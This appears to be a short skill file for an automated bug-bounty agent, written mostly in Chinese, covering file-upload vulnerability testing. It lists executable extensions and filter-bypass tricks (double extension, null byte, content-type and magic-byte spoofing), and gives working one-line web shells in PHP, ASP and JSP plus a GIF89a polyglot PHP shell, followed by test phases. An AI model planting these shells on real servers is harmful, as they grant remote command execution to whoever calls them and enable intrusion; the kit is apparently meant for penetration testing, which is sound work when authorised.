---
name: bb-file-upload
when_to_use: 目标有上传功能
---
# 文件上传测试
## 恶意扩展
.php .php3 .php4 .php5 .phtml .pht .asp .aspx .jsp .jspx .py .rb .pl .cgi .sh .bat .cmd .exe
## 绕过
double_extension / null_byte / content_type_spoofing / magic_bytes / case_variation / special_characters
## Web Shell
PHP: <?php system($_GET['cmd']); ?>
ASP: <%eval request("cmd")%>
JSP: <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
## Polyglot
GIF89a<?php system($_GET['cmd']); ?>
## 阶段
1 reconnaissance (katana/gau/paramspider)
2 baseline_testing
3 malicious_upload_testing
4 post_upload_verification
预计 360s,高风险
